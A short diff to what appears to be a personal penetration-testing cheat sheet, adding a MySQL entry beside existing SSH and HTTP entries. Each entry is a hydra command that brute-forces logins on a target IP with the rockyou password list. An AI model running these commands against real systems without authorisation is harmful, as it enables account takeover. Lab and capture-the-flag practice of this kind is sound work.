@@ -280,6 +280,11 @@ hydra -l <USER> -P <WORDLIST> <IP> ssh -t 4 -V
 hydra -l <FOUND_USERNAME -P ~/Desktop/shared/Perso-Script/wordlist/rockyou.txt -f <IP> http-get <PROTECTED_DIRECTORY>
 ````
 
+- Mysql
+````
+hydra -L <USER_LIST> -P /home/jbertin/Bureau/Hack_Tools/Perso-Script/wordlist/rockyou.txt -f <IP> mysql
+````
+
 ----
 
 ## SMB
